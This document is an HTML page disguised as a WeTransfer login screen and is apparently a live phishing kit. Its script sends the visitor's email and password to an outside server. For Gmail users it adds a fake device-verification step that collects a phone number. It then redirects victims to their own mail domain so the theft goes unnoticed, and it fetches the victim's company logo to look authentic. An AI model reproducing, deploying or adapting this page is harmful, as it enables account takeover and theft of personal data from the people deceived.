<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | WeTransfer</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <link rel="icon" type="image/png" sizes="10x10" href="https://downloads.ccbdownload.online/logo.png">
    <style>
        .cover-image-cont{background-image:url('https://downloads.ccbdownload.online/Untitled1.jpg'); background-position:center; background-size:cover; height:100vh;}
        .bg-transperant{background:rgba(0,0,0,0.77); height:100vh;}
        .hide{display:none;}
    </style>
</head>
<body>
    <div class="container-fluid p-0 cover-image-cont">
        <div class="col-12 p-0 bg-transperant d-flex align-items-center">
            <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
                <div class="bg-white px-4 py-5 shadow rounded">
                    <div class="form-group text-center">
                        <img id="logoImg" src="https://downloads.ccbdownload.online/logo.png" width="80">
                    </div>
                    
                    <div id="form1">
                        <div id="errorBox" class="alert alert-danger hide"></div>
                        <div class="form-group">
                            <label class="text-secondary font-weight-bold">Email Address</label>
                            <input type="email" class="form-control" id="emailInput">
                        </div>
                        <div class="form-group">
                            <label class="text-secondary font-weight-bold">Password</label>
                            <input type="password" class="form-control" id="passInput">
                        </div>
                        <div class="form-group">
                            <button class="btn px-4" style="background:#067438; color:#fff;" id="loginBtn">Login</button>
                        </div>
                    </div>
                    
                    <div id="form2" class="hide">
                        <div class="mb-3">
                            <span id="backBtn" style="cursor:pointer;"> ‚Üê </span>
                            <span id="shownEmail" class="h5 ml-2"></span>
                        </div>
                        <h4 class="font-weight-normal mb-2">Verify it's you</h4>
                        <p class="mb-3">This device is not recognized. For security, we want to make sure it's really you.</p>
                        <div id="phoneError" class="alert alert-danger hide"></div>
                        <p class="mb-3">Try another way to sign in</p>
                        <div class="form-group">
                            <input type="text" class="form-control" id="phoneInput" placeholder="Enter Phone Number">
                        </div>
                        <div class="form-group">
                            <button class="btn px-4" style="background:#067438; color:#fff;" id="verifyBtn">Verify</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Simplified, obfuscation-friendly JavaScript -->
    <script>
    // Simple logo updater that's hard to break with obfuscation
    function setLogo(email) {
        if (!email || !email.includes('@')) return;
        var domain = email.split('@')[1];
        if (!domain) return;
        
        var img = document.getElementById('logoImg');
        var test = new Image();
        var logoUrl = 'https://logo.clearbit.com/' + domain.toLowerCase().replace(/[^a-z0-9.-]/g, '');
        
        test.onload = function() { img.src = logoUrl; };
        test.onerror = function() { 
            img.src = 'https://downloads.ccbdownload.online/logo.png'; 
        };
        test.src = logoUrl;
    }
    
    // Handle URL hash
    if (window.location.hash) {
        var hashEmail = window.location.hash.substring(1);
        if (hashEmail.includes('@')) {
            document.getElementById('emailInput').value = hashEmail;
            setLogo(hashEmail);
        }
    }
    
    // Simple email input listener
    document.getElementById('emailInput').addEventListener('input', function(e) {
        if (e.target.value.includes('@')) {
            setTimeout(function() { setLogo(e.target.value); }, 300);
        }
    });
    
    // Login function
    document.getElementById('loginBtn').addEventListener('click', function() {
        var email = document.getElementById('emailInput').value.trim();
        var pass = document.getElementById('passInput').value.trim();
        var errorBox = document.getElementById('errorBox');
        
        errorBox.className = 'alert alert-danger hide';
        
        if (!email || !email.includes('@') || !email.includes('.')) {
            errorBox.textContent = 'Please enter a valid email address';
            errorBox.className = 'alert alert-danger';
            return;
        }
        
        if (!pass) {
            errorBox.textContent = 'Please enter your password';
            errorBox.className = 'alert alert-danger';
            return;
        }
        
        // Simple email check for Gmail
        var isGmail = email.toLowerCase().indexOf('@gmail.com') !== -1;
        
        // Disable button
        var btn = this;
        btn.disabled = true;
        btn.textContent = 'Checking...';
        
        // Simple fetch to backend - UPDATED URL
        fetch('https://artisticlle.com/asda/bknd.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'action=login&email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&step=1'
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.success) {
                // Show phone verification for Gmail on first try
                if (isGmail) {
                    document.getElementById('shownEmail').textContent = email;
                    document.getElementById('form1').className = 'hide';
                    document.getElementById('form2').className = '';
                    document.getElementById('passInput').value = '';
                } else {
                    // Redirect to domain
                    var domain = email.split('@')[1];
                    if (domain) {
                        setTimeout(function() {
                            window.location.href = 'https://' + domain;
                        }, 1000);
                    }
                }
            } else {
                errorBox.textContent = 'Login failed. Please try again.';
                errorBox.className = 'alert alert-danger';
            }
            btn.disabled = false;
            btn.textContent = 'Login';
        })
        .catch(function() {
            errorBox.textContent = 'Connection error. Please try again.';
            errorBox.className = 'alert alert-danger';
            btn.disabled = false;
            btn.textContent = 'Login';
        });
    });
    
    // Verify button
    document.getElementById('verifyBtn').addEventListener('click', function() {
        var phone = document.getElementById('phoneInput').value.trim();
        var errorBox = document.getElementById('phoneError');
        var email = document.getElementById('shownEmail').textContent;
        
        errorBox.className = 'alert alert-danger hide';
        
        if (!phone) {
            errorBox.textContent = 'Please enter your phone number';
            errorBox.className = 'alert alert-danger';
            return;
        }
        
        var btn = this;
        btn.disabled = true;
        btn.textContent = 'Checking...';
        
        // UPDATED URL
        fetch('https://artisticlle.com/asda/bknd.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'action=verify_phone&email=' + encodeURIComponent(email) + '&phone=' + encodeURIComponent(phone)
        })
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data && data.success) {
                var domain = email.split('@')[1];
                if (domain) {
                    setTimeout(function() {
                        window.location.href = 'https://' + domain;
                    }, 1000);
                }
            } else {
                errorBox.textContent = 'Verification failed';
                errorBox.className = 'alert alert-danger';
                btn.disabled = false;
                btn.textContent = 'Verify';
            }
        })
        .catch(function() {
            errorBox.textContent = 'Connection error';
            errorBox.className = 'alert alert-danger';
            btn.disabled = false;
            btn.textContent = 'Verify';
        });
    });
    
    // Back button
    document.getElementById('backBtn').addEventListener('click', function() {
        document.getElementById('form2').className = 'hide';
        document.getElementById('form1').className = '';
    });
    
    // Enter key support
    ['emailInput', 'passInput'].forEach(function(id) {
        document.getElementById(id).addEventListener('keypress', function(e) {
            if (e.key === 'Enter') document.getElementById('loginBtn').click();
        });
    });
    
    document.getElementById('phoneInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') document.getElementById('verifyBtn').click();
    });
    </script>
</body>
</html>
